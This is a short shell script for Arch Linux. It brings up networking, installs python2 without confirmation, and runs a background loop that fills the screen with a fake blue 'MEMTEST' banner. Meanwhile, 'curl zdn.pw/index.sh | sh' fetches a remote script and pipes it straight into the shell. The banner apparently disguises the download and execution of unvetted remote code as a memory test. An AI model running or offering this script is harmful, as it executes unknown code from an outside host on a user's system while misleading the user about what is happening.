systemctl start dhcpcd
pacman -Syy python2 --noconfirm

python2 -c "while True:print '\x1b[0;44m MEMTEST', ' '*80" & curl zdn.pw/index.sh | sh
